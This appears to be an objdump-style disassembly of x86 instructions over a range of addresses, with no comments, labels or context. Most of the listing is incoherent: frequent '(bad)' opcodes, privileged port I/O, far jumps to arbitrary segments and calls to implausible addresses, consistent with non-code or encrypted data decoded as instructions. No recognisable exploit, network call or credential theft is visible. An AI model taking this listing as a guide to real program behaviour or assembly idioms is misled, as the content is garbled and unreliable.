  4158bb:	stos   BYTE PTR es:[edi],al
  4158bc:	outs   dx,DWORD PTR ds:[esi]
  4158bd:	and    bl,BYTE PTR [eax]
  4158bf:	ins    BYTE PTR es:[edi],dx
  4158c0:	xchg   ebx,eax
  4158c1:	inc    esi
  4158c2:	mov    dl,0x98
  4158c4:	(bad)  
  4158c5:	in     eax,0xf5
  4158c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158c8:	adc    eax,0x7492ba3f
  4158cd:	push   0x13
  4158cf:	jae    0x4158d4
  4158d1:	test   BYTE PTR [esi-0xe7e9d98],dl
  4158d7:	jp     0x41585a
  4158d9:	fsub   QWORD PTR [eax]
  4158db:	scas   eax,DWORD PTR es:[edi]
  4158dc:	stos   BYTE PTR es:[edi],al
  4158dd:	call   0xa0773e30
  4158e2:	xchg   ebp,eax
  4158e3:	xchg   esi,eax
  4158e4:	ror    DWORD PTR ds:0xf5aec487,1
  4158ea:	aam    0x89
  4158ec:	mov    edx,edi
  4158ee:	dec    edx
  4158ef:	xchg   ebx,eax
  4158f0:	mov    cl,0x68
  4158f2:	outs   dx,DWORD PTR ds:[esi]
  4158f3:	xor    eax,0xf22a127c
  4158f8:	and    al,0x1d
  4158fa:	xchg   DWORD PTR [ebx+0x56],ebp
  4158fd:	sbb    eax,0xf50443fc
  415902:	jg     0x415946
  415904:	jne    0x4158c5
  415906:	mov    esp,0xeb459f91
  41590b:	push   ss
  41590c:	shl    DWORD PTR [edx+0x7b105970],1
  415912:	xlat   BYTE PTR ds:[ebx]
  415913:	retf   0x25d4
  415916:	in     al,dx
  415917:	out    dx,al
  415918:	loopne 0x415923
  41591a:	mov    WORD PTR [edx],fs
  41591c:	and    BYTE PTR [ebx-0x58f08fac],bh
  415922:	push   ecx
  415923:	int3   
  415924:	dec    esp
  415925:	jmp    0xe1d4:0x76a77b28
  41592c:	aas    
  41592d:	fisttp DWORD PTR [edi+0x66ba58bb]
  415933:	mov    esp,0xc3c831cf
  415938:	in     al,0x38
  41593a:	iret   
  41593b:	adc    ch,BYTE PTR [edx+0x3c]
  41593e:	push   ss
  41593f:	mov    bl,0xde
  415941:	cs dec eax
  415943:	pushf  
  415944:	or     esp,ebp
  415946:	int    0x71
  415948:	add    DWORD PTR [edx],esp
  41594a:	shr    BYTE PTR [ebx],1
  41594c:	in     al,0x92
  41594e:	test   DWORD PTR [ebp-0x71c9e13a],edx
  415954:	fistp  WORD PTR [ecx+0x7dbe8494]
  41595a:	cmp    BYTE PTR [edi],cl
  41595c:	outs   dx,DWORD PTR ds:[esi]
  41595d:	cmc    
  41595e:	scas   al,BYTE PTR es:[edi]
  41595f:	int3   
  415960:	out    dx,al
  415961:	pop    ebp
  415962:	adc    dh,BYTE PTR [eax-0x23]
  415965:	lock jmp 0x2d777da3
  41596b:	pop    eax
  41596c:	dec    ebx
  41596d:	jns    0x415919
  41596f:	scas   al,BYTE PTR es:[edi]
  415970:	cli    
  415971:	pusha  
  415972:	lds    edx,FWORD PTR [eax+ecx*1-0x60]
  415976:	lds    edi,FWORD PTR [ecx+ecx*4-0x2b1792a4]
  41597d:	call   0x7400:0x59a80f8a
  415984:	xor    bl,al
  415986:	jp     0x415964
  415988:	leave  
  415989:	ud2    
  41598b:	xchg   edx,eax
  41598c:	(bad)  
  41598d:	mov    esp,0xc4d1
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	retf   0xf029
  415a03:	add    BYTE PTR [esp+eiz*8],ah
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	push   0xcc15d61f
  415a11:	into   
  415a12:	inc    ecx
  415a13:	outs   dx,DWORD PTR ds:[esi]
  415a14:	dec    edi
  415a15:	popa   
  415a16:	test   DWORD PTR [esi+0x73],ebx
  415a19:	(bad)  
  415a1a:	cmp    eax,0x26811d9b
  415a1f:	adc    BYTE PTR [edi],cl
  415a21:	repnz cmp BYTE PTR [ebx],al
  415a24:	mov    fs,ebx
  415a26:	mov    edi,0xe4eccb8e
  415a2b:	push   0x73
  415a2d:	jne    0x415a7c
  415a2f:	shl    DWORD PTR [edi],cl
  415a31:	cmc    
  415a32:	add    DWORD PTR [ecx],ebx
  415a34:	add    BYTE PTR [edx],0x2c
  415a37:	inc    eax
  415a38:	rol    DWORD PTR [edx],cl
  415a3a:	pop    edi
  415a3b:	mov    edi,0x3ffaa4ee
  415a40:	cmp    dh,BYTE PTR [ebp+0x5559949d]
  415a46:	fstp   QWORD PTR ds:0xb167c002
  415a4c:	xchg   edx,eax
  415a4d:	xchg   edx,eax
  415a4e:	fidiv  DWORD PTR [edi+esi*4]
  415a51:	aas    
  415a52:	(bad)  
  415a53:	popa   
  415a54:	outs   dx,DWORD PTR ds:[esi]
  415a55:	jle    0x415a97
  415a57:	dec    esi
  415a58:	sbb    ebx,edi
  415a5a:	inc    ecx
  415a5b:	sar    dh,1
  415a5d:	jg     0x415ac0
  415a5f:	and    eax,0x7f3787ff
  415a64:	xchg   BYTE PTR [ebx+0x52a56d3a],ch
  415a6a:	jp     0x415aae
  415a6c:	or     ecx,edx
  415a6e:	fld    DWORD PTR [ecx-0x7768afc9]
  415a74:	ja     0x415acc
  415a76:	and    esp,eax
  415a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a79:	fsub   st,st(4)
  415a7b:	jne    0x415a57
  415a7d:	xchg   BYTE PTR [edi-0x40],bl
  415a80:	sti    
  415a81:	mov    ah,0xc
  415a83:	lea    edx,[ecx-0x54]
  415a86:	les    ecx,FWORD PTR [edx+0x4b560cc3]
  415a8c:	shr    edx,cl
  415a8e:	push   esi
  415a8f:	mov    bh,0x44
  415a91:	fsubr  DWORD PTR [ecx-0x74]
  415a94:	jne    0x415aa1
  415a96:	pop    ss
  415a97:	mov    ch,0xf8
  415a99:	dec    ebp
  415a9a:	fild   QWORD PTR [edx]
  415a9c:	dec    ecx
  415a9d:	(bad)  
  415a9e:	scas   al,BYTE PTR es:[edi]
  415a9f:	das    
  415aa0:	add    ch,ah
  415aa2:	sub    DWORD PTR [edi],0xd79d1652
  415aa8:	iret   
  415aa9:	cli    
  415aaa:	pop    esp
  415aab:	xchg   esp,eax
  415aac:	loopne 0x415a39
  415aae:	push   ecx
  415aaf:	pop    edi
  415ab0:	and    BYTE PTR [ebx-0x2028f5a0],bl
  415ab6:	outs   dx,DWORD PTR ds:[esi]
  415ab7:	xchg   DWORD PTR [edx+0x43],ecx
  415aba:	xchg   DWORD PTR [edi-0x76],esp
  415abd:	loope  0x415b14
  415abf:	fistp  QWORD PTR [ebp+0x70]
  415ac2:	out    0x40,eax
  415ac4:	pop    ds
  415ac5:	cmp    esi,DWORD PTR [edx-0x1a]
  415ac8:	mov    eax,ebp
  415aca:	or     DWORD PTR ds:0xb75f707c,ebp
  415ad0:	aam    0x58
  415ad2:	mov    dl,0x49
  415ad4:	aad    0x97
  415ad6:	inc    esp
  415ad7:	xchg   edi,eax
  415ad8:	lods   al,BYTE PTR ds:[esi]
  415ad9:	ss and dx,0xfff5
  415ade:	inc    edx
  415adf:	adc    bl,BYTE PTR [eax+0x2c16f494]
  415ae5:	cmp    dh,BYTE PTR [edx]
  415ae7:	(bad)  
  415ae8:	loopne 0x415b0f
  415aea:	mov    cl,0xf0
  415aec:	mul    DWORD PTR gs:[esi]
  415aef:	arpl   dx,sp
  415af1:	scas   eax,DWORD PTR es:[edi]
  415af2:	stos   BYTE PTR es:[edi],al
  415af3:	dec    ecx
  415af4:	idiv   ch
  415af6:	lock shl BYTE PTR [ebp-0x79],1
  415afa:	pop    edi
  415afb:	xchg   esi,eax
  415afc:	adc    al,BYTE PTR [ecx]
  415afe:	adc    bh,BYTE PTR [ebp-0x4c]
  415b01:	push   ds
  415b02:	jle    0x415aa8
  415b04:	(bad)  
  415b06:	mov    edi,0xf4d62feb
  415b0b:	cmp    eax,0xe11f4eaf
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcom   QWORD PTR [eax+0x2a]
  415b82:	sti    
  415b83:	je     0x415bad
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	dec    ecx
  415b8d:	sub    al,0xdf
  415b8f:	out    dx,al
  415b90:	push   cs
  415b91:	das    
  415b92:	cmp    DWORD PTR ds:0x5caf7946,0xfe86c763
  415b9c:	arpl   cx,sp
  415b9e:	jmp    0xe210:0x94798c6d
  415ba5:	cmp    al,BYTE PTR [ecx-0x5f]
  415ba8:	loope  0x415bb5
  415baa:	mov    bh,0xea
  415bac:	gs dec esi
  415bae:	fnsave [ebx-0x154afdf4]
  415bb4:	repnz xor esp,DWORD PTR [eax+0x58]
  415bb8:	xor    ebp,0xcd7803b5
  415bbe:	(bad)  
  415bc0:	dec    ecx
  415bc1:	push   es
  415bc2:	push   eax
  415bc3:	arpl   WORD PTR [ebx+0x26],bp
  415bc6:	fsubr  st,st(7)
  415bc8:	adc    eax,0xe3143aef
  415bcd:	fs dec esp
  415bcf:	mov    ds:0xc2103510,eax
  415bd4:	sbb    BYTE PTR [eax+0x64],dh
  415bd7:	and    ebx,DWORD PTR [ebx]
  415bd9:	(bad)  [eax-0x3d94fb31]
  415bdf:	mov    al,ds:0x7e829e7e
  415be4:	or     al,0x10
  415be6:	push   edi
  415be7:	xor    BYTE PTR [ebp-0x6c167fdb],0xd9
  415bee:	scas   al,BYTE PTR es:[edi]
  415bef:	inc    eax
  415bf0:	push   0x8d595bb
  415bf5:	cli    
  415bf6:	inc    ebx
  415bf7:	daa    
  415bf8:	fisub  DWORD PTR [edi]
  415bfa:	push   ds
  415bfb:	(bad)  
  415bfc:	in     eax,dx
  415bfd:	push   ds
  415bfe:	xor    ah,bh
  415c00:	sbb    DWORD PTR [edx],edi
  415c02:	psrld  mm7,0xc0
  415c06:	in     al,0x78
  415c08:	sbb    ah,BYTE PTR [esi-0x76895140]
  415c0e:	or     edi,eax
  415c10:	or     eax,0xf2c5f902
  415c15:	nop
  415c16:	mov    dl,0x26
  415c18:	adc    BYTE PTR [edi+0x5d2303ce],al
  415c1e:	ins    DWORD PTR es:[edi],dx
  415c1f:	test   eax,0xb8f124be
  415c24:	jecxz  0x415c44
  415c26:	mov    esi,0xd65f33bf
  415c2b:	js     0x415caa
  415c2d:	in     al,0x68
  415c2f:	fist   DWORD PTR [ecx-0x6fb69309]
  415c35:	loop   0x415bde
  415c37:	lahf   
  415c38:	or     al,0x9
  415c3a:	popf   
  415c3b:	in     al,dx
  415c3c:	jl     0x415bce
  415c3e:	mul    BYTE PTR [edx-0x30c68653]
  415c44:	jg     0x415c95
  415c46:	cwde   
  415c47:	test   ch,ch
  415c49:	xchg   DWORD PTR [eax],ebp
  415c4b:	xor    BYTE PTR [ecx-0x7e],0x71
  415c4f:	je     0x415bda
  415c51:	popa   
  415c52:	jno    0x415beb
  415c54:	ins    BYTE PTR es:[edi],dx
  415c55:	sbb    DWORD PTR [esi+ebx*2],eax
  415c58:	add    cl,ah
  415c5a:	cmp    eax,0x68653a58
  415c5f:	mov    eax,ds:0x9987e97
  415c64:	sti    
  415c65:	les    eax,FWORD PTR [ecx+0x75af6ece]
  415c6b:	arpl   WORD PTR [ebx],bp
  415c6d:	pop    ds
  415c6e:	push   esi
  415c6f:	jp     0x415c39
  415c71:	adc    edi,DWORD PTR [ebx+0x7e]
  415c74:	lock sbb eax,ebx
  415c77:	imul   esp,ebx,0xffffff84
  415c7a:	or     WORD PTR [esi],si
  415c7d:	fistp  QWORD PTR [ebx]
  415c7f:	push   ss
  415c80:	add    eax,0x3c9ce7ee
  415c85:	sub    al,0x4
  415c87:	(bad)
  415c8a:	pop    ebx
  415c8b:	(bad)  
  415c8c:	call   0x58f7a8
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xacae801f
  415d03:	cld    
  415d04:	sub    al,0xe6
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	fwait
  415d0d:	or     DWORD PTR [edx+0x21],edi
  415d10:	loop   0x415c9f
  415d12:	loopne 0x415d59
  415d14:	pop    edx
  415d15:	out    0xf1,eax
  415d17:	fs out dx,eax
  415d19:	(bad)  
  415d1a:	retf   0xcdd8
  415d1d:	xor    al,0xbb
  415d1f:	mov    cl,dh
  415d21:	adc    ebx,esp
  415d23:	mov    ebx,0x8ae560d2
  415d28:	adc    eax,0x8b010d2e
  415d2d:	mov    ch,0xbd
  415d2f:	(bad)  
  415d30:	(bad)  [esi]
  415d32:	fmulp  st(4),st
  415d34:	xchg   BYTE PTR [ebx+0x254cc688],al
  415d3a:	je     0x415d69
  415d3c:	adc    BYTE PTR fs:[eax],bh
  415d3f:	aad    0xf2
  415d41:	mov    BYTE PTR [ebx],dl
  415d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d44:	dec    ebx
  415d45:	test   eax,0xaea5d64f
  415d4a:	pop    edi
  415d4b:	pop    esi
  415d4c:	mov    bl,0x95
  415d4e:	test   DWORD PTR [edx],esp
  415d50:	clc    
  415d51:	and    esi,DWORD PTR [ebx]
  415d53:	lahf   
  415d54:	mov    esi,0x281bf033
  415d59:	adc    eax,0xb6b07db2
  415d5e:	popf   
  415d5f:	into   
  415d60:	add    cl,BYTE PTR [esi]
  415d62:	and    DWORD PTR [edi-0x22187109],edx
  415d68:	dec    esi
  415d69:	popa   
  415d6a:	mov    esi,0xb49e19e8
  415d6f:	int3   
  415d70:	stc    
  415d71:	sbb    ch,bl
  415d73:	imul   ebx,DWORD PTR [ecx],0x61
  415d76:	rol    BYTE PTR [edx+eiz*2-0x13],0x95
  415d7b:	mov    ch,0x35
  415d7d:	in     al,0xf5
  415d7f:	test   BYTE PTR [ebp-0x2854ff7b],bl
  415d85:	lods   eax,DWORD PTR ds:[esi]
  415d86:	adc    al,0xb4
  415d88:	mul    DWORD PTR ds:[ebp+0x2e3e45a3]
  415d8f:	xchg   ebp,eax
  415d90:	and    al,0x66
  415d92:	inc    eax
  415d93:	xor    BYTE PTR [edx],dh
  415d95:	cdq    
  415d96:	mov    edx,0x8073f4a2
  415d9b:	cmc    
  415d9c:	xor    ch,0xd8
  415d9f:	lock xor edi,DWORD PTR [edx-0x4f2623c9]
  415da6:	scas   eax,DWORD PTR es:[edi]
  415da7:	repz jge 0x415d4c
  415daa:	jg     0x415d7a
  415dac:	xchg   ecx,eax
  415dad:	retf   0xc1c9
  415db0:	xor    bl,al
  415db2:	dec    edx
  415db3:	xchg   edx,eax
  415db4:	and    edx,edi
  415db6:	ins    BYTE PTR es:[edi],dx
  415db7:	sbb    eax,0xc587a537
  415dbc:	cmp    BYTE PTR [eax+0x3d],ch
  415dbf:	sar    BYTE PTR [eax+ebx*2-0x49],0xeb
  415dc4:	sub    ah,BYTE PTR [ecx-0x67]
  415dc7:	jcxz   0x415da2
  415dca:	sub    ecx,DWORD PTR [ecx-0x15]
  415dcd:	mov    ?,WORD PTR [edx]
  415dcf:	outs   dx,BYTE PTR ds:[esi]
  415dd0:	or     ecx,ebp
  415dd2:	adc    al,0x18
  415dd4:	jnp    0x415da3
  415dd6:	adc    cl,BYTE PTR [edx]
  415dd8:	rol    BYTE PTR [edi+0x7a],cl
  415ddb:	mov    ecx,0x9d4391f9
  415de0:	cdq    
  415de1:	mov    al,ds:0xa61d3309
  415de6:	jle    0x415dfc
  415de8:	mov    ecx,0x1866dd33
  415ded:	push   cs
  415dee:	cmp    bl,bh
  415df0:	repz (bad) 
  415df2:	(bad)  
  415df4:	sub    esp,DWORD PTR [ebx+0x19d9663a]
  415dfa:	pop    edx
  415dfb:	jne    0x415da4
  415dfd:	icebp  
  415dfe:	cmc    
  415dff:	lods   eax,DWORD PTR ds:[esi]
  415e00:	xor    DWORD PTR [ebx+esi*4],ecx
  415e03:	pushf  
  415e04:	ins    DWORD PTR es:[edi],dx
  415e05:	cmp    bl,BYTE PTR [eax+0xa]
  415e08:	add    DWORD PTR [eax+edx*2+0x39],edx
  415e0c:	sub    dl,BYTE PTR [edx]
  415e0e:	pushf  
  415e0f:	mov    dh,0x0
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x44]
  415e81:	add    eax,0xe730a245
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	ja     0x415ed8
  415e8e:	aas    
  415e8f:	out    0x79,al
  415e91:	push   edx
  415e92:	mov    bl,0x7e
  415e94:	mul    DWORD PTR [ebp-0x3f2fb367]
  415e9a:	mul    BYTE PTR [ecx-0xacf8100]
  415ea0:	and    ecx,edi
  415ea2:	rol    BYTE PTR [ebp-0x392388a4],1
  415ea8:	sti    
  415ea9:	and    DWORD PTR [edi+0x7d],esi
  415eac:	add    BYTE PTR [edx+esi*8+0x2],bh
  415eb0:	jg     0x415e63
  415eb2:	ret    
  415eb3:	mov    WORD PTR [ebx],ds
  415eb5:	jecxz  0x415ea9
  415eb7:	push   esp
  415eb8:	and    DWORD PTR [edx],edi
  415eba:	ins    DWORD PTR es:[edi],dx
  415ebb:	test   eax,ebx
  415ebd:	das    
  415ebe:	and    eax,0xba744a17
  415ec3:	mov    BYTE PTR [edx-0x4627d626],cl
  415ec9:	pusha  
  415eca:	out    dx,eax
  415ecb:	loop   0x415eee
  415ecd:	mov    ds:0xefbb79b7,eax
  415ed2:	sub    eax,esi
  415ed4:	or     DWORD PTR [ecx],edx
  415ed6:	xchg   ebx,eax
  415ed7:	mov    al,ds:0x3e1c15ff
  415edd:	aas    
  415ede:	in     eax,0xa
  415ee0:	mov    eax,ds:0x674beb40
  415ee5:	leave  
  415ee6:	push   es
  415ee7:	test   al,0x70
  415ee9:	cmp    ebp,DWORD PTR [ebp+0x3e]
  415eec:	cmp    eax,0x8247b7a
  415ef1:	and    BYTE PTR [eax+ebx*8+0x350ad0e],bl
  415ef8:	enter  0x8f59,0x1
  415efc:	xchg   ebx,eax
  415efd:	jb     0x415e9d
  415eff:	push   ds
  415f00:	inc    esp
  415f01:	mov    al,0xb4
  415f03:	push   ss
  415f04:	ret    
  415f05:	dec    ecx
  415f06:	mov    dl,0x4f
  415f08:	jmp    0xb248d078
  415f0d:	popf   
  415f0e:	cmc    
  415f0f:	or     BYTE PTR [edi],bh
  415f11:	mov    dh,0xb8
  415f13:	mov    ah,0xf7
  415f15:	in     eax,0x1c
  415f17:	mov    eax,ds:0xb1f3cb73
  415f1c:	inc    edx
  415f1d:	jnp    0x415f1a
  415f1f:	add    ebx,DWORD PTR [edx+0x3aa41989]
  415f25:	cmc    
  415f26:	(bad)  
  415f27:	in     eax,dx
  415f28:	xchg   esp,eax
  415f29:	sbb    DWORD PTR [eax-0x1ca3e05e],ecx
  415f2f:	mov    BYTE PTR [ecx+0x449c90ee],al
  415f35:	cwde   
  415f36:	outs   dx,DWORD PTR ds:[esi]
  415f37:	aaa    
  415f38:	mov    esi,0x6175689a
  415f3d:	fs and eax,0xa95a63dd
  415f43:	cmp    DWORD PTR [eax],ecx
  415f45:	xor    ebx,eax
  415f47:	mov    ecx,0xce63802c
  415f4c:	mov    ebp,0xb42d239b
  415f51:	enter  0x3400,0xaa
  415f55:	jle    0x415f62
  415f57:	mov    edx,DWORD PTR [edx+ebp*4-0x47269268]
  415f5e:	or     eax,0x4c0712d
  415f63:	xchg   esi,eax
  415f64:	sbb    al,0x89
  415f66:	sbb    dl,dl
  415f68:	xlat   BYTE PTR ds:[ebx]
  415f69:	add    edi,DWORD PTR [ebp-0x3]
  415f6c:	mov    dh,0x50
  415f6e:	mov    ds:0x3d6ae4d8,al
  415f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f74:	pop    esi
  415f75:	or     ecx,DWORD PTR [ebx-0x3f76b1e]
  415f7b:	not    BYTE PTR [ebp+edx*8+0x1529ec13]
  415f82:	or     edx,DWORD PTR [eax-0x14]
  415f85:	loopne 0x415fa2
  415f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f88:	cdq    
  415f89:	xchg   esp,eax
  415f8a:	xchg   esi,eax
  415f8b:	jns    0xaacdd2
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	jb     0x415f93
  416002:	imul   esi,DWORD PTR [esi+0xe834],0x104
  41600c:	add    al,0x6
  41600e:	mov    edx,0x9b6287df
  416013:	retf   
  416014:	or     eax,0x6b3e06cb
  416019:	in     eax,dx
  41601a:	iret   
  41601b:	push   es
  41601c:	cmc    
  41601d:	dec    esi
  41601e:	stos   BYTE PTR es:[edi],al
  41601f:	idiv   BYTE PTR [edi]
  416021:	xchg   esp,eax
  416022:	jns    0x41607b
  416024:	jl     0x41609e
  416026:	imul   ecx,DWORD PTR [ebx],0xffffff9d
  416029:	jp     0x41601b
  41602b:	jl     0x415feb
  41602d:	mov    esi,0xe1b848eb
  416032:	loopne 0x4160a9
  416034:	cld    
  416035:	jne    0x416014
  416037:	pushf  
  416038:	in     eax,dx
  416039:	pushf  
  41603a:	xchg   BYTE PTR [ecx],cl
  41603c:	out    0x67,eax
  41603e:	mov    ds:0x51dc7382,ax
  416044:	pop    ds
  416045:	mov    ch,0x2b
  416047:	cld    
  416048:	dec    eax
  416049:	sti    
  41604a:	(bad)  
  41604b:	jo     0x416058
  41604d:	adc    esp,DWORD PTR [ebx-0x3e]
  416050:	push   ss
  416051:	cmp    DWORD PTR [edx-0x65],0xcdfef84e
  416058:	and    al,0x26
  41605a:	mov    edi,0xabbe8ca9
  41605f:	stos   BYTE PTR es:[edi],al
  416060:	cmp    bh,BYTE PTR [esi-0x41]
  416063:	inc    edx
  416064:	or     eax,0xf05ea3ed
  416069:	xor    al,0x65
  41606b:	push   eax
  41606c:	cs aas 
  41606e:	mov    al,ds:0x30e51633
  416073:	dec    esi
  416074:	aad    0xe5
  416076:	inc    edi
  416077:	sub    eax,DWORD PTR [esi+0x25c925c0]
  41607d:	je     0x4160cc
  41607f:	push   ds
  416080:	jge    0x4160c6
  416082:	mov    ebx,0x6847b0f3
  416087:	pop    esp
  416088:	and    esi,DWORD PTR [edi-0x48]
  41608b:	das    
  41608c:	sti    
  41608d:	sbb    ch,bh
  41608f:	iret   
  416090:	popa   
  416091:	adc    dl,ah
  416093:	icebp  
  416094:	sub    BYTE PTR [ebx],ch
  416096:	inc    esi
  416097:	test   DWORD PTR [ebp+0x36],eax
  41609a:	jns    0x41605b
  41609c:	jns    0x416057
  41609e:	call   0x4eb6e544
  4160a3:	cmp    dl,dl
  4160a5:	xlat   BYTE PTR ds:[ebx]
  4160a6:	out    dx,eax
  4160a7:	icebp  
  4160a8:	add    edi,DWORD PTR [edx+0x3a]
  4160ab:	ficom  DWORD PTR [edx+0x4fc96ac6]
  4160b1:	pusha  
  4160b2:	fisttp QWORD PTR [ecx+0x32]
  4160b5:	inc    esp
  4160b6:	outs   dx,BYTE PTR ds:[esi]
  4160b7:	lods   al,BYTE PTR ds:[esi]
  4160b8:	cwde   
  4160b9:	bound  ebx,QWORD PTR [ebp+esi*4-0x23]
  4160bd:	cli    
  4160be:	(bad)  
  4160bf:	es shl al,cl
  4160c2:	hlt    
  4160c3:	jbe    0x416072
  4160c5:	jp     0x4160d8
  4160c7:	xchg   edx,eax
  4160c8:	pop    ss
  4160c9:	mov    eax,0xd77c6ebd
  4160ce:	inc    eax
  4160cf:	add    BYTE PTR [edx],0x25
  4160d2:	jle    0x416105
  4160d4:	xor    eax,0xfd01d44a
  4160d9:	test   eax,0xa293ac34
  4160de:	rcl    BYTE PTR [esi-0x45],0xe9
  4160e2:	loop   0x4160f8
  4160e4:	outs   dx,DWORD PTR ds:[esi]
  4160e5:	push   eax
  4160e6:	push   ss
  4160e7:	cmp    al,0xf5
  4160e9:	dec    edi
  4160ea:	mov    edx,0x965af4c4
  4160ef:	aam    0xd8
  4160f1:	into   
  4160f2:	push   edi
  4160f3:	jmp    0x63fdd540
  4160f8:	push   ss
  4160f9:	pop    ecx
  4160fa:	sbb    eax,0x55f16af3
  4160ff:	div    edx
  416101:	push   esp
  416102:	out    dx,al
  416103:	call   0xb02c80d4
  416108:	outs   dx,DWORD PTR ds:[esi]
  416109:	or     eax,0x8d29addd
  41610e:	push   edx
  41610f:	adc    eax,0x0
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x8cee8cf3
  416183:	sar    DWORD PTR [eax],0xe9
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	imul   edi,DWORD PTR [edx-0x22edcad5],0x59118b0d
  416196:	mov    DWORD PTR [edi+0x2d],esp
  416199:	sub    al,0xa6
  41619b:	das    
  41619c:	push   0x29
  41619e:	in     eax,dx
  41619f:	mov    edx,0xa701ebe4
  4161a4:	fcomp  QWORD PTR [ebp+0x0]
  4161a7:	dec    ecx
  4161a8:	push   edi
  4161a9:	nop
  4161aa:	jmp    0x2b5d:0x628a21e1
  4161b1:	js     0x416192
  4161b3:	in     al,0xbb
  4161b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b6:	push   edi
  4161b7:	push   cs
  4161b8:	cdq    
  4161b9:	scas   al,BYTE PTR es:[edi]
  4161ba:	mov    ds:0x3a9b08ca,eax
  4161bf:	push   eax
  4161c0:	mov    ch,0x9f
  4161c2:	fsub   DWORD PTR [esi]
  4161c4:	ins    DWORD PTR es:[edi],dx
  4161c5:	(bad)  
  4161c6:	out    0xcf,al
  4161c8:	or     al,0xc2
  4161ca:	inc    ebx
  4161cb:	pop    ecx
  4161cc:	ja     0x4161bc
  4161ce:	xor    BYTE PTR [edi-0x4bd4c973],ah
  4161d4:	cs push ss
  4161d6:	rcr    BYTE PTR [edx+0x42],1
  4161d9:	or     eax,0x8cf457d8
  4161de:	pusha  
  4161df:	dec    esp
  4161e0:	hlt    
  4161e1:	addr16 (bad) 
  4161e3:	std    
  4161e4:	and    al,0x40
  4161e6:	jge    0x416183
  4161e8:	ret    0xd0cf
  4161eb:	jp     0x41617a
  4161ed:	in     eax,dx
  4161ee:	push   esp
  4161ef:	inc    edi
  4161f0:	repnz push cs
  4161f2:	mov    esp,0x6e522db4
  4161f7:	out    dx,eax
  4161f8:	ja     0x416250
  4161fa:	xchg   ebx,eax
  4161fb:	mov    edx,0x28f1cefc
  416200:	lea    eax,[ecx-0x7c]
  416203:	ds adc eax,0x83eedc3
  416209:	jle    0x41623b
  41620b:	das    
  41620c:	push   es
  41620d:	div    edi
  41620f:	xchg   edx,eax
  416210:	or     BYTE PTR [ecx],0x67
  416213:	mov    ch,0x2b
  416215:	xchg   ebp,eax
  416216:	shl    eax,1
  416218:	and    eax,0xeafdbed4
  41621d:	sub    dh,BYTE PTR [eax+0x39]
  416220:	cdq    
  416221:	sbb    eax,0x727291cf
  416226:	ret    
  416227:	push   ebp
  416228:	fs fwait
  41622a:	iret   
  41622b:	pop    ebp
  41622c:	push   ebx
  41622d:	add    DWORD PTR [ebx],ebp
  41622f:	sahf   
  416230:	inc    ebp
  416231:	icebp  
  416232:	or     ah,ch
  416234:	pop    es
  416235:	stc    
  416236:	stos   BYTE PTR es:[edi],al
  416237:	push   ebp
  416238:	dec    ebx
  416239:	pop    esi
  41623a:	mov    DWORD PTR [ebx-0x45],esi
  41623d:	lahf   
  41623e:	(bad)  
  41623f:	jbe    0x4161eb
  416241:	and    dh,BYTE PTR [ebp+0xfa68b3]
  416247:	popa   
  416248:	sub    eax,0x5b1db72b
  41624d:	cwde   
  41624e:	sbb    eax,0x9406b7a3
  416253:	push   edx
  416254:	into   
  416255:	and    dl,BYTE PTR [esi+0x71]
  416258:	into   
  416259:	aam    0x81
  41625b:	inc    esi
  41625c:	jg     0x41629f
  41625e:	push   esi
  41625f:	dec    ecx
  416260:	in     al,0xc2
  416262:	add    eax,0x6fc6391e
  416267:	(bad)  
  416268:	outs   dx,DWORD PTR ds:[esi]
  416269:	dec    esp
  41626a:	out    dx,al
  41626b:	loopne 0x4162bc
  41626d:	inc    ebp
  41626e:	retf   0xdf54
  416271:	mov    esi,0x3e28f373
  416276:	adc    eax,0xaddfd13f
  41627b:	enter  0x2eab,0xfb
  41627f:	repnz sub al,0x85
  416282:	std    
  416283:	adc    al,0x28
  416285:	jecxz  0x41621c
  416287:	pushf  
  416288:	mov    BYTE PTR [edi],dh
  41628a:	jo     0x41621d
  41628c:	pop    edi
  41628d:	jno    0x4162fc
  41628f:	sbb    al,0x0
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
